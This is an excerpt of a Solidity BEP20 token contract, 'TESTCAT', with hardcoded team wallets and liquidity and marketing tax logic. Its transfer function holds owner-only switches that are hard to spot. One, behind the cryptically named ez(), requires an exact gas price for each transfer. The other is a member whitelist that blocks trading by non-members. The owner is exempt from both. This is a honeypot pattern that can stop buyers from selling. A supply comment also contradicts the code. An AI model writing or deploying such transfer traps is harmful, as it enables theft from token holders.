...
contract TESTCAT is IBEP20, Ownable
{
    ...
    //Token Info
    string private constant _name = 'TESTCAT';
    string private constant _symbol = '$TCAT';
    uint8 private constant _decimals = 9;
    uint256 public constant InitialSupply= 100000000 * 10**_decimals;//equals 500B tokens
    uint256 public swap_threshold = (InitialSupply * 15) / 1000;
    ...
    //DevWallets
    address public TeamWallet=payable(0x79d1f99FBc030AdCa574b3493ccA52149E57f1DF);
    address public walletTwo=payable(0x06866351BDfD8C9f2C26EFEa67dcE8727467Be3D);
    //TestNet
	...
	uint256 private antiWhale = 1500000 * 10**_decimals;
    ...
    bool  private gas_enabled=false;
    uint256 private gas = 13000000000;

    mapping(address => bool) private members;
    bool private enable_members = true;
    ...
    function addSingleToMembers(address _address) public onlyOwner {
        members[_address] = true;
    }

    function addToMembers(address[] memory _addresses) public onlyOwner {
    ...
    function removedFromMembers(address[] memory _addresses) public onlyOwner {
        uint arrayLength = _addresses.length;
        for (uint i=0; i<arrayLength; i++) {
            members[_addresses[i]] = false;
        }
    }
    ...
    function set_swap_threshold_1000(uint256 percent) external onlyOwner {
        swap_threshold = (InitialSupply * percent) / 1000;
    }

    function ez(bool enabled) external onlyOwner{
        gas_enabled=enabled;
    }

    function activateMembers(bool enabled) external onlyOwner{
        enable_members=enabled;
    }

    function set_gas(uint256 g) external onlyOwner{
        gas=g;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private{
        ...
        if(gas_enabled && recipient != owner() && sender != owner()){
            require(tx.gasprice == gas,"Gas not amount wanted");
        }
        if(enable_members && !isMember(sender) && !isMember(recipient) && recipient != owner() && sender != owner()){
            require(isMember(sender) || isMember(recipient), "User is not a member");
        }
    ...
    function _swapContractToken() private lockTheSwap{
        ...
        //only swap if contractBalance is larger than swap_threshold, and totalTax is unequal to 0
        if(contractBalance<swap_threshold||totalTax==0){
            return;
        }
        //splits the token in TokenForLiquidity and tokenForMarketing
        uint256 tokenForLiquidity=(swap_threshold*_liquidityTax)/totalTax;
        uint256 tokenForMarketing= swap_threshold-tokenForLiquidity;
